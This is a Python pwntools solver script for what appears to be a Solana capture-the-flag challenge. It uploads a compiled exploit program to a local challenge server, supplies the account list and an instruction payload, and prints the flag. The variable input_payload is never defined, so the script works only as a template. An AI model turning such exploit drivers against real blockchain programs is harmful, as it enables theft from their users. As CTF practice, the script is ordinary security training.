from pwn import *
from solders.pubkey import Pubkey as PublicKey
from solders.system_program import ID
import base58
from borsh_construct import CStruct, U8
import os
os.system('cargo build-sbf')
r = remote('127.0.0.1',1337) # Change to remote

solve = open('target/deploy/solve.so', 'rb').read()

r.recvuntil(b'program pubkey: ')
r.sendline(b'5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwyexx')
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)
r.recvuntil(b'program: ')
program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b'user: ')
user = PublicKey(base58.b58decode(r.recvline().strip().decode()))
print("User:" + str(user))
r.recvuntil(b'noobmaster: ')
noobmaster = PublicKey(base58.b58decode(r.recvline().strip().decode()))


r.sendline(b'4') # Number of accounts, can change accordingly

# Follows order as expected by your solve contract's process_instruction
r.sendline(b'x ' + str(program).encode())
r.sendline(b'ws ' + str(user).encode())
r.sendline(b'w ' + str(noobmaster).encode())
r.sendline(b'x ' + str(ID).encode())
# What is input_payload? it is the data to be sent to your solve contract. 
# "pub fn process_instruction(program: &Pubkey, accounts: &[AccountInfo], mut data: &[u8])" In this case, the input_payload is our "data"
r.sendline(str(len(input_payload)).encode()) # IX len
r.send(input_payload) # my payload / data
r.readuntil(b'1337 h4x0r: ')
print(r.readline().strip()) # Flag!
